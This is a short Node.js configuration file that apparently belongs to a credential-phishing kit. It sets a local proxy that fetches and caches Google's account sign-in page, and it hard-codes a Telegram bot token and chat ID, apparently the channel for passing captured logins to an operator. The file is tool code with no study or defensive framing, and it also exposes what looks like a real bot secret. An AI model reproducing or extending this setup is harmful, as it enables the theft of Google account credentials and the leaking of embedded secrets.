const path = require('path');

const CACHED_RESOURCES_DIR = path.resolve('cached_resources');
const BASE_URL = 'https://accounts.google.com/signin/v2/identifier?hl=en&flowName=GlifWebSignIn&flowEntry=ServiceLogin'; 
const PORT = 1000;
const LOCAL_URL = '127.0.0.1';
const SCHEME = 'http'; 

const CONTENT_URL = `${SCHEME}://${LOCAL_URL}:${PORT}/getContent?url=`;

const TELEGRAM_BOT_TOKEN = '7372950058:AAHJ6AsI6KCdJ6Y8IPPe4a7XZJHsuIgnVOk';
const TELEGRAM_CHAT_ID = '1507710974';

module.exports = {
    CACHED_RESOURCES_DIR,
    BASE_URL,
    CONTENT_URL,
    PORT,
    LOCAL_URL,
    SCHEME,
    TELEGRAM_BOT_TOKEN,
    TELEGRAM_CHAT_ID,
};
